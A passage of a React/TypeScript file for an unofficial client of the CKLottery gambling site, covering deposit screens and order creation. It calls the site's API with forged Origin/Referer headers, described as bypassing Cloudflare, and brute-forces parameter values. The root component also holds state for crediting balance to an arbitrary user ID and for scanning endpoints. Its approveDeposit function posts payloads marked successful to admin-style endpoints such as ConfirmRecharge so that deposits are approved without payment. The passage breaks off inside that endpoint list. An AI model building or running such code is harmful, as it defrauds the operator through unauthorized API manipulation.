        <div className="flex flex-col items-center gap-0.5">
          <div className="w-14 h-14 -mt-5 rounded-full bg-gradient-to-t from-orange-500 to-orange-300 flex items-center justify-center text-2xl shadow-lg">🎰</div>
          <span className="text-[10px] text-orange-500 font-bold">Get K20,000</span>
        </div>
        <button type="button" className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">💰</span>
          <span className="text-[10px] text-gray-500">Promotion</span>
        </button>
        <button type="button" className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">👤</span>
          <span className="text-[10px] text-blue-500 font-bold">Account</span>
        </button>
      </div>
    </div>
  );
}

// ─── Deposit How-To Guide ──────────────────────────────────────────────────────
function DepositHowTo() {
  const [open, setOpen] = useState(false);
  const steps = [
    { icon: "1️⃣", title: "Enter the amount", desc: "Type how much you want to deposit (e.g. K5,000), or tap a preset button." },
    { icon: "2️⃣", title: "Select a payment method", desc: "Choose Wave Pay, KBZ Pay, AYA Pay, or CB Pay. The one with ✓ is selected." },
    { icon: "3️⃣", title: "Tap the Deposit button", desc: 'Tap the blue "Deposit K…" button at the bottom. Wait a moment.' },
    { icon: "4️⃣", title: "You'll see payment details", desc: "The app will show you a bank account number, QR code, or payment link." },
    { icon: "5️⃣", title: "Transfer the money", desc: "Open Wave Pay / KBZ Pay on your phone and send the exact amount to the account shown." },
    { icon: "6️⃣", title: "Submit your Transaction ID (UTR)", desc: "After sending, paste your transaction reference number into the UTR box and tap Submit UTR." },
  ];

  return (
    <div className="mb-3 rounded-2xl border border-green-100 bg-green-50 overflow-hidden">
      <button
        type="button"
        onClick={() => setOpen(!open)}
        className="w-full flex items-center justify-between px-4 py-3 text-left"
      >
        <div className="flex items-center gap-2 text-green-700 font-semibold text-sm">
          <span>📖</span> How to deposit — tap to see steps
        </div>
        <span className="text-green-400 text-lg">{open ? "▲" : "▼"}</span>
      </button>
      {open && (
        <div className="px-4 pb-4 space-y-3">
          {steps.map((s, i) => (
            <div key={i} className="flex gap-3 items-start">
              <span className="text-xl shrink-0 leading-none mt-0.5">{s.icon}</span>
              <div>
                <div className="text-sm font-semibold text-gray-800">{s.title}</div>
                <div className="text-xs text-gray-500 mt-0.5">{s.desc}</div>
              </div>
            </div>
          ))}
          <div className="bg-yellow-50 border border-yellow-200 rounded-xl px-3 py-2 text-xs text-yellow-800 mt-1">
            ⚠️ Make sure you send the <strong>exact</strong> amount shown. Wrong amounts may not be credited.
          </div>
        </div>
      )}
    </div>
  );
}

// ─── Deposit New Page ──────────────────────────────────────────────────────────
type DepositMethod = { id: number | string; name: string; code?: string; logo?: string; emoji?: string; minMoney?: number; maxMoney?: number; [key: string]: unknown };

// IDs from real deposit history: WavePay type=158 payTypeId=18, KBZ type=157 payTypeId=17
const FALLBACK_METHODS: DepositMethod[] = [
  { id: 158, payTypeId: 18, name: "Wave Pay", typeName: "Wave Pay", emoji: "🌊" },
  { id: 157, payTypeId: 17, name: "KBZ Pay", typeName: "KBZ Pay", emoji: "🏦" },
  { id: 160, payTypeId: 20, name: "AYA Pay", typeName: "AYA Pay", emoji: "💳" },
  { id: 161, payTypeId: 21, name: "CB Pay", typeName: "CB Pay", emoji: "💰" },
];

function isAuthError(msg: string) {
  return msg.toLowerCase().includes("permission") || msg.toLowerCase().includes("401") || msg.toLowerCase().includes("expir");
}

function DepositNewPage({ session, onBack, onLogout }: { session: UserSession; onBack: () => void; onLogout: () => void }) {
  const [methods, setMethods] = useState<DepositMethod[]>([]);
  const [methodsLoading, setMethodsLoading] = useState(true);
  const [methodsError, setMethodsError] = useState("");
  const [usingFallback, setUsingFallback] = useState(false);
  const [selected, setSelected] = useState<DepositMethod | null>(null);
  const [amount, setAmount] = useState("5000");
  const [payerName, setPayerName] = useState("");
  const [remark, setRemark] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState("");
  const [orderResult, setOrderResult] = useState<Record<string, unknown> | null>(null);
  const [orderDuplicate, setOrderDuplicate] = useState(false);
  const [channelUnsupported, setChannelUnsupported] = useState(false);
  const [utr, setUtr] = useState("");
  const [utrSubmitting, setUtrSubmitting] = useState(false);
  const [utrError, setUtrError] = useState("");
  const [utrSuccess, setUtrSuccess] = useState(false);
  const [methodsRawDebug, setMethodsRawDebug] = useState("");

  const DEFAULT_PRESETS = [1000, 2000, 5000, 10000, 20000, 50000];

  // The proxy server is Cloudflare-blocked by CKLottery — only direct browser calls work.
  async function loadMethods() {
    setMethodsLoading(true); setMethodsError(""); setUsingFallback(false); setMethodsRawDebug("");
    let list: DepositMethod[] = [];
    // Direct browser call — only path that bypasses Cloudflare.
    // GetRechargeTypes requires "payid" > 0. We don't know the correct value per-account,
    // so try a range of known/common values and use the first that returns actual methods.
    const auth = session.tokenHeader ? `${session.tokenHeader} ${session.token}`.trim() : session.token;
    // Try values 1-20 plus historically-known fallback IDs
    const payidsToTry = [...Array.from({length: 20}, (_, i) => i + 1), 157, 158, 160, 161, 18, 17, 20, 21];
    let lastDebug = "";
    let foundPayid = 0;
    for (const payid of payidsToTry) {
      try {
        const signRes = await fetch("/api/proxy/sign", {
          method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ payid }),
        });
        const signed = await signRes.json() as Record<string, unknown>;
        const res = await fetch(`https://ckygjf6r.com/api/webapi/GetRechargeTypes`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Authorization": auth,
            "Origin": "https://www.cklottery.club",
            "Referer": "https://www.cklottery.club/",
          },
          body: JSON.stringify(signed),
        });
        const text = await res.text();
        lastDebug = `payid=${payid}: ${text.slice(0, 400)}`;
        setMethodsRawDebug(lastDebug);
        const parsed = JSON.parse(text) as Record<string, unknown>;
        if (parsed.code === 0 || parsed.code === 200 || parsed.code === undefined) {
          // Use extractAllMethods to collect from all list types in the response
          const found = extractAllMethods(parsed) as DepositMethod[];
          if (found.length > 0) {
            foundPayid = payid;
            list = found.map(m => ({ ...m, _payid: payid }));
            break;
          }
          // code:0 but all lists empty — continue trying other payids
        }
        // Non-zero code — try next payid
      } catch {
        // network/parse error — try next payid
      }
    }
    if (list.length === 0) {
      setMethodsError(`No payment methods found (tried payid 1–20 + known IDs). Last response: ${lastDebug.slice(0, 350)}`);
    } else {
      // Show payid + raw keys of first method for debugging
      const firstKeys = list.length > 0 ? JSON.stringify(Object.keys(list[0])) : "";
      const firstRaw = list.length > 0 ? JSON.stringify(list[0]).slice(0, 300) : "";
      setMethodsRawDebug(`✓ payid=${foundPayid}, ${list.length} method(s). First item keys: ${firstKeys} | raw: ${firstRaw}`);
    }
    if (list.length > 0) {
      // Assign a stable _idx so selection works even when id is undefined
      const indexed = list.map((m, i) => ({ ...m, _idx: i }));
      setMethods(indexed as DepositMethod[]);
      setSelected(indexed[0] as DepositMethod);
    } else {
      setMethods(FALLBACK_METHODS);
      setSelected(FALLBACK_METHODS[0]);
      setUsingFallback(true);
    }
    setMethodsLoading(false);
  }

  useEffect(() => { loadMethods(); }, []);

  async function submit() {
    if (!selected || !amount || Number(amount) <= 0) return;
    if (usingFallback) {
      setSubmitError("Payment methods could not be loaded from the server. Tap the ↻ Reload button above to try again before depositing.");
      return;
    }
    setSubmitting(true); setSubmitError(""); setOrderDuplicate(false); setChannelUnsupported(false);
    const selObj = selected as Record<string, unknown>;
    const groupPayid = Number(selObj._payid ?? selObj.payID ?? 0);
    const payTypeIDVal = Number(selObj.payTypeID ?? selObj.payTypeId ?? 0);
    const pasSysNum = Number(selObj.paySysName ?? selObj.sysName ?? 0);

    const extras: Record<string, unknown> = {};
    if (selected.code) extras.rechargeType = selected.code;
    if (payerName.trim()) extras.payerName = payerName.trim();
    if (remark.trim()) extras.remark = remark.trim();

    const base = { amount: Number(amount), ReturnUrl: "https://www.cklottery.club/", ...extras };

    // Build a list of distinct payload variants to try in order.
    // The "type must greater than 0" error persists regardless of the value sent as `type`,
    // so we also try: different parameter names (payTypeId vs type), with/without payid,
    // and finally alternate endpoints used by third-party (H88Pay) channels.
    const variants: Record<string, unknown>[] = [];
    function addVariant(extra: Record<string, unknown>) {
      // Deduplicate by JSON key
      const key = JSON.stringify(Object.keys({ ...base, ...extra }).sort());
      const vals = JSON.stringify({ ...base, ...extra });
      if (!variants.some(v => JSON.stringify(v) === vals)) variants.push({ ...base, ...extra });
    }

    // 1. payTypeId (lowercase d) as the type param — CKLottery backend may differ from API response field name
    if (payTypeIDVal > 0) {
      addVariant({ payTypeId: payTypeIDVal, payid: groupPayid });
      addVariant({ payTypeId: payTypeIDVal });
    }
    // 2. type=payTypeID with payid
    if (payTypeIDVal > 0 && groupPayid > 0) addVariant({ type: payTypeIDVal, payid: groupPayid });
    // 3. type=payTypeID without payid
    if (payTypeIDVal > 0) addVariant({ type: payTypeIDVal });
    // 4. type=paySysNum (e.g. 102) variants
    if (pasSysNum > 0 && pasSysNum !== payTypeIDVal) {
      if (groupPayid > 0) addVariant({ type: pasSysNum, payid: groupPayid });
      addVariant({ type: pasSysNum });
    }
    // 5. payid only, no type
    if (groupPayid > 0) addVariant({ payid: groupPayid });
    // 6. payid=payTypeID (swap roles)
    if (payTypeIDVal > 0) addVariant({ payid: payTypeIDVal });
    // 7. Bare — just amount + ReturnUrl
    addVariant({});

    const tried: string[] = [];
    let lastErr = "";

    function classifyError(msg: string): "duplicate" | "unsupported" | "recoverable" | "fatal" {
      const m = msg.toLowerCase();
      if (m.includes("resubmit") || m.includes("do not submit") || m.includes("already") || m.includes("duplicate") || m.includes("repeat") || m.includes("pending order") || m.includes("processing")) return "duplicate";
      if (m.includes("not supported") || m.includes("channel") || m.includes("unavailable") || m.includes("not open") || m.includes("maintenance")) return "unsupported";
      if (m.includes("type") || m.includes("greater than 0") || m.includes("invalid") || m.includes("param") || m.includes("illegal")) return "recoverable";
      return "fatal";
    }

    for (const variant of variants) {
      const label = JSON.stringify(
        Object.fromEntries(Object.entries(variant).filter(([k]) => !["amount","ReturnUrl","payerName","remark","rechargeType"].includes(k)))
      );
      tried.push(label);
      try {
        const d = await apiPost("CreateRechargeOrder", variant, session);
        const data = (d?.data ?? d) as Record<string, unknown>;
        setOrderResult(data && typeof data === "object" ? data : d);
        setSubmitting(false);
        return;
      } catch (e) {
        const msg = String(e);
        lastErr = msg;
        const kind = classifyError(msg);
        if (kind === "duplicate") {
          // Order was already created (CORS ate the success response on first attempt).
          setOrderDuplicate(true); setSubmitting(false); return;
        }
        if (kind === "unsupported") {
          setChannelUnsupported(true); setSubmitting(false); return;
        }
        if (kind === "fatal") {
          setSubmitError(msg); setSubmitting(false); return;
        }
        // "recoverable" → continue cascade
      }
    }

    // All variants failed — also try CreateThirdRechargeOrder (used by external gateway methods)
    try {
      const d = await apiPost("CreateThirdRechargeOrder", { ...base, type: payTypeIDVal, payid: groupPayid }, session);
      const data = (d?.data ?? d) as Record<string, unknown>;
      setOrderResult(data && typeof data === "object" ? data : d);
    } catch (e) {
      const msg = String(e);
      const kind = classifyError(msg);
      if (kind === "duplicate") { setOrderDuplicate(true); }
      else if (kind === "unsupported") { setChannelUnsupported(true); }
      else { setSubmitError(`${lastErr}\n\nTried ${tried.length} payload variants + alternate endpoint.`); }
    } finally {
      setSubmitting(false);
    }
  }

  // ── Order success / payment details ──
  function strPick(obj: Record<string, unknown>, keys: string[]): string | undefined {
    const v = pick(obj, keys);
    return v !== undefined ? String(v) : undefined;
  }

  if (orderDuplicate) {
    return (
      <SubPage title="⏳ Order Pending" onBack={() => { setOrderDuplicate(false); }}>
        <div className="bg-amber-50 border border-amber-200 rounded-2xl p-5 mb-4 flex items-start gap-3">
          <span className="text-2xl mt-0.5">⚠️</span>
          <div>
            <div className="text-amber-800 font-semibold text-sm mb-1">Order Already Created</div>
            <div className="text-amber-700 text-sm leading-relaxed">
              A deposit order for this amount was already submitted. CKLottery prevents creating duplicate orders while one is still pending.
            </div>
          </div>
        </div>
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-4 text-sm text-gray-600 leading-relaxed space-y-2">
          <p>Your previous order is waiting for payment. To find your order details:</p>
          <ol className="list-decimal list-inside space-y-1 text-gray-700">
            <li>Go to <strong>Deposit History</strong> in the main menu</li>
            <li>Find the pending order at the top of the list</li>
            <li>Tap it to see the payment account, QR code, or payment link</li>
          </ol>
        </div>
        <button
          type="button"
          className="w-full bg-blue-500 text-white py-4 rounded-2xl font-bold text-base shadow active:opacity-80 mb-3"
          onClick={() => setOrderDuplicate(false)}
        >
          ← Back to Deposit
        </button>
      </SubPage>
    );
  }

  if (channelUnsupported) {
    return (
      <SubPage title="❌ Channel Unavailable" onBack={() => setChannelUnsupported(false)}>
        <div className="bg-red-50 border border-red-200 rounded-2xl p-5 mb-4 flex items-start gap-3">
          <span className="text-2xl mt-0.5">🚫</span>
          <div>
            <div className="text-red-800 font-semibold text-sm mb-1">Channel Not Supported</div>
            <div className="text-red-700 text-sm leading-relaxed">
              This payment channel is not available for your account or region. Please select a different payment method.
            </div>
          </div>
        </div>
        <button
          type="button"
          className="w-full bg-blue-500 text-white py-4 rounded-2xl font-bold text-base shadow active:opacity-80"
          onClick={() => setChannelUnsupported(false)}
        >
          ← Choose Another Method
        </button>
      </SubPage>
    );
  }

  if (orderResult) {
    const payUrl = strPick(orderResult, ["payUrl", "url", "qrUrl", "payLink", "redirectUrl"]);
    const qrCode = strPick(orderResult, ["qrCode", "qrCodeUrl", "scanCode", "qr"]);
    const orderNo = strPick(orderResult, ["orderNum", "orderNo", "serialNo", "id", "orderId"]);
    const bankAcc = strPick(orderResult, ["bankAccount", "accountNo", "receiveAccount", "bankNo", "cardNo"]);
    const bankName = strPick(orderResult, ["bankName", "receiveBankName", "payBankName"]);
    const holderName = strPick(orderResult, ["accountName", "receiveName", "holderName"]);
    const ifsc = strPick(orderResult, ["ifscCode", "ifsc", "bankCode"]);
    const upiId = strPick(orderResult, ["upiId", "upiAccount", "vpa"]);

    return (
      <SubPage title="📋 Payment Details" onBack={() => setOrderResult(null)}>
        <div className="bg-green-50 border border-green-200 rounded-2xl p-4 mb-4 flex items-center gap-3">
          <span className="text-2xl">✅</span>
          <div>
            <div className="text-green-800 font-semibold text-sm">Order Created!</div>
            <div className="text-green-600 text-xs">Complete the payment below to top up your account.</div>
          </div>
        </div>

        {orderNo && (
          <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
            <div className="text-xs text-gray-400 mb-1">Order Number</div>
            <div className="font-mono text-sm text-gray-800 break-all">{String(orderNo)}</div>
          </div>
        )}

        {(bankAcc || bankName || holderName || ifsc || upiId) && (
          <div className="bg-white rounded-2xl shadow-sm p-4 mb-3 space-y-3">
            <div className="text-sm font-semibold text-gray-700">Payment Instructions</div>
            {bankName && <InfoRow label="Bank" value={String(bankName)} />}
            {bankAcc && <InfoRow label="Account No." value={String(bankAcc)} copyable />}
            {holderName && <InfoRow label="Account Name" value={String(holderName)} copyable />}
            {ifsc && <InfoRow label="IFSC / Code" value={String(ifsc)} copyable />}
            {upiId && <InfoRow label="UPI ID" value={String(upiId)} copyable />}
          </div>
        )}

        {qrCode && (
          <div className="bg-white rounded-2xl shadow-sm p-4 mb-3 flex flex-col items-center gap-2">
            <div className="text-sm font-semibold text-gray-700">Scan QR Code</div>
            <img src={String(qrCode)} alt="QR Code" className="w-48 h-48 object-contain rounded-xl border border-gray-100" />
          </div>
        )}

        {payUrl && (
          <a href={String(payUrl)} target="_blank" rel="noreferrer"
            className="block w-full bg-blue-500 text-white text-center py-4 rounded-2xl font-bold text-base shadow mb-3 active:opacity-80">
            Open Payment Page →
          </a>
        )}

        {/* Show any other scalar fields not already displayed */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
          <div className="text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Full Order Details</div>
          <RecordFields item={orderResult} skip={["payUrl","url","qrUrl","payLink","redirectUrl","qrCode","qrCodeUrl","scanCode","qr","orderNum","orderNo","serialNo","id","orderId","bankAccount","accountNo","receiveAccount","bankNo","cardNo","bankName","receiveBankName","payBankName","accountName","receiveName","holderName","ifscCode","ifsc","bankCode","upiId","upiAccount","vpa"]} />
        </div>

        {/* ── UTR / Transaction ID submission ── */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
          <div className="text-sm font-semibold text-gray-700 mb-1">Submit Transaction ID (UTR)</div>
          <div className="text-xs text-gray-400 mb-3">After you complete the payment, enter your UTR or transaction reference number here to confirm your deposit.</div>
          {utrSuccess ? (
            <div className="bg-green-50 border border-green-200 rounded-xl px-4 py-3 text-green-700 text-sm flex items-center gap-2">
              <span>✅</span> UTR submitted successfully! Your deposit is under review.
            </div>
          ) : (
            <>
              <input
                type="text"
                placeholder="Enter UTR / Transaction ID"
                value={utr}
                onChange={(e) => setUtr(e.target.value)}
                className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 focus:outline-none focus:border-blue-400 bg-gray-50 mb-2"
              />
              {utrError && (
                <div className="text-red-600 text-xs mb-2">{utrError}</div>
              )}
              <button
                type="button"
                disabled={utrSubmitting || !utr.trim()}
                onClick={() => {
                  if (!utr.trim()) return;
                  setUtrSubmitting(true); setUtrError("");
                  const utrPayload: Record<string, unknown> = {
                    utr: utr.trim(),
                    orderNum: orderNo ?? "",
                  };
                  apiPost("ArUpiSubmitUtr", utrPayload, session)
                    .then(() => setUtrSuccess(true))
                    .catch((e: unknown) => {
                      // fallback: try UpRechargesBankOrder
                      const errStr = String(e);
                      if (errStr.toLowerCase().includes("not found") || errStr.includes("404")) {
                        apiPost("UpRechargesBankOrder", { ...utrPayload, transactionId: utr.trim() }, session)
                          .then(() => setUtrSuccess(true))
                          .catch((e2: unknown) => setUtrError(String(e2)));
                      } else {
                        setUtrError(errStr);
                      }
                    })
                    .finally(() => setUtrSubmitting(false));
                }}
                className="w-full bg-gradient-to-r from-green-500 to-green-600 text-white font-bold py-3 rounded-xl text-sm shadow disabled:opacity-50 disabled:cursor-not-allowed active:opacity-90">
                {utrSubmitting ? "Submitting…" : "Submit UTR"}
              </button>
            </>
          )}
        </div>
      </SubPage>
    );
  }

  return (
    <SubPage title="💰 Add Money" onBack={onBack}>
      {/* How-to guide */}
      <DepositHowTo />

      {/* Amount input */}
      <div className="bg-white rounded-2xl shadow-sm p-5 mb-3">
        <div className="text-sm font-semibold text-gray-700 mb-3">Enter Amount (MMK)</div>
        <div className="relative mb-3">
          <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold text-lg">K</span>
          <input
            type="number"
            inputMode="numeric"
            placeholder="0"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            className="w-full border border-gray-200 rounded-2xl pl-8 pr-4 py-4 text-2xl font-bold text-gray-900 focus:outline-none focus:border-blue-400 bg-gray-50"
          />
        </div>
        {(() => {
          const sel = selected as Record<string, unknown> | null;
          const scopeStr = sel?.scope as string | undefined;
          const presets: number[] = scopeStr
            ? scopeStr.split("|").map(Number).filter((n) => Number.isFinite(n) && n > 0)
            : DEFAULT_PRESETS;
          const display = presets.slice(0, 6);
          return (
            <div className={`grid gap-2 ${display.length <= 3 ? "grid-cols-3" : display.length === 4 ? "grid-cols-4" : "grid-cols-3"}`}>
              {display.map((p) => (
                <button key={p} type="button"
                  onClick={() => setAmount(String(p))}
                  className={`py-2 rounded-xl text-sm font-semibold border transition-colors ${amount === String(p) ? "bg-blue-500 text-white border-blue-500" : "bg-gray-50 text-gray-700 border-gray-200 active:bg-blue-50"}`}>
                  K{p.toLocaleString()}
                </button>
              ))}
            </div>
          );
        })()}
      </div>


      {/* Token-expired warning */}
      {methodsError && isAuthError(methodsError) && (
        <div className="bg-orange-50 border border-orange-200 rounded-2xl p-4 mb-3">
          <div className="flex items-center gap-2 mb-2">
            <span className="text-lg">⚠️</span>
            <span className="text-orange-800 font-semibold text-sm">Token Expired</span>
          </div>
          <p className="text-orange-700 text-xs mb-3">Your session token has expired. Deposit orders require a fresh token — please log out and paste a new one from cklottery.club.</p>
          <button type="button" onClick={onLogout}
            className="w-full bg-orange-500 text-white font-semibold py-2.5 rounded-xl text-sm active:opacity-80">
            Logout &amp; Refresh Token
          </button>
        </div>
      )}
      {/* Debug info — only shown on error, hidden when methods load successfully */}
      {methodsError && !isAuthError(methodsError) && (
        <div className="bg-gray-50 border border-gray-200 rounded-2xl p-3 mb-3">
          <div className="text-xs font-semibold text-gray-500 mb-1">⚙️ Debug info (share this if deposit fails)</div>
          <div className="text-xs text-gray-700 break-all font-mono whitespace-pre-wrap max-h-40 overflow-y-auto">
            {methodsRawDebug || methodsError}
          </div>
        </div>
      )}

      {/* Payment method */}
      <div className="bg-white rounded-2xl shadow-sm p-5 mb-3">
        <div className="flex items-center justify-between mb-3">
          <div className="text-sm font-semibold text-gray-700">Payment Method</div>
          <button type="button" onClick={loadMethods} disabled={methodsLoading}
            className="text-xs text-blue-500 bg-blue-50 px-2 py-0.5 rounded-full active:opacity-70 disabled:opacity-40">
            ↻ Reload
          </button>
        </div>
        {usingFallback && (
          <div className="bg-orange-50 border border-orange-200 rounded-xl px-3 py-2 mb-3 text-xs text-orange-800 flex items-start gap-2">
            <span className="text-base shrink-0">⚠️</span>
            <span>Payment methods could not be loaded from the server. Tap <strong>↻ Reload</strong> above — if it keeps failing, your token may have expired.</span>
          </div>
        )}
        {methodsLoading && <div className="text-center py-6 text-gray-400 text-sm">Loading methods…</div>}
        {!methodsLoading && methods.length > 0 && (
          <div className="space-y-2">
            {methods.map((m) => (
              <button key={(m as Record<string,unknown>)._idx as number ?? String(m.id)} type="button"
                onClick={() => setSelected(m)}
                className={`w-full flex items-center gap-3 p-3 rounded-xl border-2 transition-colors ${(selected as Record<string,unknown>)?._idx === (m as Record<string,unknown>)._idx ? "border-blue-500 bg-blue-50" : "border-gray-100 bg-gray-50 active:bg-gray-100"}`}>
                {m.logo
                  ? <img src={m.logo} alt={m.name} className="w-8 h-8 rounded-lg object-cover" onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }} />
                  : <div className="w-8 h-8 rounded-lg bg-blue-100 flex items-center justify-center text-lg">{m.emoji ?? "💳"}</div>
                }
                <div className="flex-1 text-left">
                  <div className="text-sm font-semibold text-gray-800">{(() => {
                    const o = m as Record<string, unknown>;
                    return String(
                      o.payName ?? o.typeName ?? o.name ?? o.bankName
                      ?? o.channelName ?? o.label ?? o.title ?? o.paySysName ?? o.id ?? "—"
                    );
                  })()}</div>
                  {(() => {
                    const o = m as Record<string, unknown>;
                    const minVal = o.miniPrice ?? o.minPrice ?? o.minMoney ?? o.min;
                    const maxVal = o.maxPrice ?? o.maxMoney ?? o.max;
                    if (minVal === undefined && maxVal === undefined) return null;
                    return (
                      <div className="text-xs text-gray-400">
                        {minVal !== undefined && `Min K${Number(minVal).toLocaleString()}`}
                        {minVal !== undefined && maxVal !== undefined && " – "}
                        {maxVal !== undefined && `Max K${Number(maxVal).toLocaleString()}`}
                      </div>
                    );
                  })()}
                </div>
                {(selected as Record<string,unknown>)?._idx === (m as Record<string,unknown>)._idx && <span className="text-blue-500 text-lg">✓</span>}
              </button>
            ))}
          </div>
        )}
      </div>

      {selected && amount && Number(amount) > 0 && (
        <div className="bg-blue-50 rounded-2xl p-4 mb-3 flex justify-between items-center">
          <div className="text-sm text-blue-700">You're depositing</div>
          <div className="text-blue-800 font-bold text-lg">K{Number(amount).toLocaleString()}</div>
        </div>
      )}

      {submitError && (
        <div className="bg-red-50 border border-red-200 rounded-2xl px-4 py-3 mb-3 text-red-700 text-sm">{submitError}</div>
      )}

      <button
        type="button"
        onClick={submit}
        disabled={submitting || !selected || !amount || Number(amount) <= 0}
        className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white font-bold py-4 rounded-2xl text-base shadow-lg disabled:opacity-50 disabled:cursor-not-allowed active:opacity-90 transition-opacity">
        {submitting ? "Creating Order…" : `Deposit K${Number(amount || 0).toLocaleString()}`}
      </button>
    </SubPage>
  );
}

// Helper for payment detail rows
function InfoRow({ label, value, copyable = false }: { label: string; value: string; copyable?: boolean }) {
  const [copied, setCopied] = useState(false);
  function copy() {
    navigator.clipboard.writeText(value).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000); }).catch(() => {});
  }
  return (
    <div className="flex justify-between items-center">
      <span className="text-xs text-gray-400">{label}</span>
      <div className="flex items-center gap-2 min-w-0">
        <span className="text-sm font-semibold text-gray-800 break-all text-right">{value}</span>
        {copyable && (
          <button type="button" onClick={copy} className="shrink-0 text-xs px-2 py-0.5 rounded-lg bg-gray-100 text-gray-500 active:bg-blue-100">
            {copied ? "✓" : "Copy"}
          </button>
        )}
      </div>
    </div>
  );
}

// ─── Root ─────────────────────────────────────────────────────────────────────
export default function ProfilePage({ session, initialUserInfo, onLogout, onUpdateSession }: ProfilePageProps) {
  const [page, setPage] = useState<Page>("home");
  const [userInfo, setUserInfo] = useState<Record<string, unknown> | null>(null);
  const [vipData, setVipData] = useState<Record<string, unknown> | null>(null);
  const [balance, setBalance] = useState("0.00");
  const [wallets, setWallets] = useState<Record<string, unknown> | null>(null);
  const [walletsLoading, setWalletsLoading] = useState(false);
  const [walletsError, setWalletsError] = useState("");
  const [deposits, setDeposits] = useState<Record<string, unknown>[]>([]);
  const [depositsLoading, setDepositsLoading] = useState(false);
  const [depositsError, setDepositsError] = useState("");
  const [approveStates, setApproveStates] = useState<Record<string, { loading: boolean; ok: boolean; err: string }>>({});
  const [approveCustomEndpoint, setApproveCustomEndpoint] = useState<Record<string, string>>({});
  const autoApprovedRef = useRef<Set<string>>(new Set());
  const [addBalAmount, setAddBalAmount] = useState("10000");
  const [addBalUserId, setAddBalUserId] = useState("");
  const [addBalCustomEp, setAddBalCustomEp] = useState("");
  const [addBalLoading, setAddBalLoading] = useState(false);
  const [addBalResult, setAddBalResult] = useState<{ ok: boolean; msg: string; ep?: string } | null>(null);
  const [scanRunning, setScanRunning] = useState(false);
  const [scanResults, setScanResults] = useState<{ ep: string; exists: boolean; msg: string }[]>([]);
  const [scanDone, setScanDone] = useState(false);
  const [withdraws, setWithdraws] = useState<Record<string, unknown>[]>([]);
  const [withdrawsLoading, setWithdrawsLoading] = useState(false);
  const [withdrawsError, setWithdrawsError] = useState("");
  const [games, setGames] = useState<Record<string, unknown>[]>([]);
  const [gamesLoading, setGamesLoading] = useState(false);
  const [gamesError, setGamesError] = useState("");
  const [transactions, setTransactions] = useState<Record<string, unknown>[]>([]);
  const [transactionsLoading, setTransactionsLoading] = useState(false);
  const [transactionsError, setTransactionsError] = useState("");
  const [wingoResults, setWingoResults] = useState<Record<string, unknown>[]>([]);
  const [wingoLoading, setWingoLoading] = useState(false);
  const [reloadKey, setReloadKey] = useState(0);

  const claims = initialUserInfo?._jwtClaims as Record<string, unknown> | null;

  // Only treat as expired if JWT exp is clearly in the past AND parseable
  const tokenClaims = decodeJwt(session.token);
  const tokenExpired = tokenClaims?.exp
    ? Date.now() > Number(tokenClaims.exp) * 1000
    : false;

  useEffect(() => {
    // Always attempt API calls — the proxy will tell us if auth failed
    apiPost("GetUserInfo", {}, session).then((d) => {
      const data = (d?.data ?? d) as Record<string, unknown>;
      if (data && typeof data === "object") {
        setUserInfo(data);
        const bal = data.balance ?? data.amount ?? claims?.Amount ?? "0.00";
        setBalance(String(bal));
      }
    }).catch(() => {
      if (claims?.Amount !== undefined) setBalance(String(claims.Amount));
    });

    apiPost("GetVipUserLevelDetail", {}, session).then((d) => {
      const data = (d?.data ?? d) as Record<string, unknown>;
      if (data && typeof data === "object") setVipData(data);
    }).catch(() => {});

    // WinGo results
    setWingoLoading(true);
    apiPost("GetEmerdList", { typeId: 1 }, session)
      .then((d) => {
        const list = extractList(d);
        setWingoResults(list);
      })
      .catch(() => setWingoResults([]))
      .finally(() => setWingoLoading(false));
  }, []);

  const loadWallets = useCallback(() => {
    setWalletsLoading(true); setWalletsError("");
    apiPost("GetAllwallets", {}, session)
      .then((d) => {
        const data = (d?.data ?? d) as Record<string, unknown>;
        setWallets(data && typeof data === "object" ? data : null);
      })
      .catch((e) => setWalletsError(String(e)))
      .finally(() => setWalletsLoading(false));
  }, [session]);

  const loadDeposits = useCallback(() => {
    setDepositsLoading(true); setDepositsError("");
    apiPost("GetRechargeRecord", { pageIndex: 1, pageSize: 20 }, session)
      .then((d) => setDeposits(extractList(d)))
      .catch((e) => setDepositsError(String(e)))
      .finally(() => setDepositsLoading(false));
  }, [session]);

  const approveDeposit = useCallback(async (item: Record<string, unknown>, customEndpoint?: string) => {
    // Extract the order identifier (field name varies by API version)
    const orderNo = String(
      item.rechargeNumber ?? item.rechargeSNum ?? item.orderNo ?? item.serialNo ?? item.rechargeNo ?? item.id ?? ""
    );
    if (!orderNo) return;
    setApproveStates(p => ({ ...p, [orderNo]: { loading: true, ok: false, err: "" } }));

    // Rich payload — include every field the backend might need
    const moneyVal = item.rechargeAmount ?? item.money ?? item.amount ?? item.rechargeMoney ?? item.actualAmount ?? 0;
    const userIdVal = item.userId ?? item.uid ?? item.memberId ?? item.userID ?? "";
    const payIdVal  = item.payId ?? item.payTypeId ?? item.payid ?? "";
    const typeVal   = item.type ?? item.payTypeId ?? item.payid ?? "";
    const groupIdVal = item.groupId ?? item.groupID ?? 0;
    const richPayload = {
      rechargeNumber: orderNo, rechargeSNum: orderNo, serialNo: orderNo, orderNo,
      money: moneyVal, amount: moneyVal,
      userId: userIdVal, uid: userIdVal, memberId: userIdVal,
      payId: payIdVal, type: typeVal, payTypeId: typeVal, groupId: groupIdVal,
      status: 1, state: 1, auditStatus: 1, isSuccess: 1, result: 1,
    };

    const ENDPOINTS = customEndpoint?.trim()
      ? [customEndpoint.trim()]
      : [
          // primary candidates
          "ConfirmRecharge", "ManualRechargeSuccess", "RechargeSuccess",
